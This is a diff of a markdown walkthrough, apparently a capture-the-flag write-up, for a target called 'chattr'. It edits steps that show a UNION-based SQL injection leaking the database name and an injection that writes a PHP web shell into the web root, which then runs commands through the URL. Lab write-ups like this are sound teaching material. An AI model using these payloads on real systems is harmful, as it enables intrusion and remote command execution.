@@ -78,11 +78,11 @@ Lets start by determine the number of columns we are working with
 
 Lets try a basic exploit to find the database name with this injection:
 
-    ') UNION SELECT 1,2,database(),4 FROM INFORMATION_SCHEMA.SCHEMATA #
+    ') UNION SELECT 1,2,database(),4 FROM INFORMATION_SCHEMA.SCHEMATA-- -
 
 <img width="1002" height="446" alt="chattr2" src="https://github.com/user-attachments/assets/46979a14-ab4e-443b-ac17-b2db7378bbf2" />
 
-- This returns: chattr
+- This returns "chattr" and more inportantly we've found a way to use an SQL injection to leak info.
 
 
 ## Finding The Admin Password:
@@ -154,10 +154,12 @@ Given that we have write permissions, let have a bit of fun and write some malic
     ') UNION SELECT "","",'<?php system($_REQUEST[0]); ?>',"" into outfile "/var/www/chattr-prod/fSociety.php"-- -
 
 - This will allow us to send commands through the url.
-    - For exampe lets list the files in the root directory (make sure to URL encode your command)
+
+- For exampe lets list the files in the root directory (make sure to URL encode your command)
+
     - Command: ls /
  
-            https://154.57.164.78:32157/fSociety.php?0=ls%20/
+          https://154.57.164.78:32157/fSociety.php?0=ls%20/
 
 <img width="1002" height="337" alt="root" src="https://github.com/user-attachments/assets/28763b2b-0977-447c-8cc9-8fa4176f5733" />
 
